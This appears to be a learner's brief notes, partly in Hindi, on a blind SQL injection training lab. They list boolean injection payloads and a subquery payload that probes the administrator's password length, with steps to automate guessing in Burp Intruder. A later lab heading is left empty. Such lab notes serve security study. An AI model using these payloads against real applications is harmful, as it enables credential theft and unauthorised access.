1. **_Lab11 (Blind SQLi):_**
	   
    output nahi dikhta, badle me koi error aayega ya time out hojayega 
    
    1=1, no difference 
    1=2, difference
    
    password,1 (1st character)== a , no diff means the 1st character is a
    
    lhMhN4cIXVwF9tXh' AND 1=1--    true
    lhMhN4cIXVwF9tXh' AND 1=2--    false, welcome message disappears
    
    lhMhN4cIXVwF9tXh' AND LENGTH(SELECT password FROM users where username= 'administrator') =1--
    
    we hit the above payload then check for the 'welcome back' sign, if it is not the mean that there's an error and we need to check no multiple entries to match the length to
    
	so we send the code to intruder to automate the payload and check for the password length
	
	after sending it to the intruder we select the 1 and click on add, then change the payload type to number and start from 1 to 100.
	
	 then we check for variable length
	 lhMhN4cIXVwF9tXh' AND LENGTH((SELECT password FROM users WHERE username= 'administrator')) = 1--;
	 
	 
    
2. _Lab12:_
	   
	   


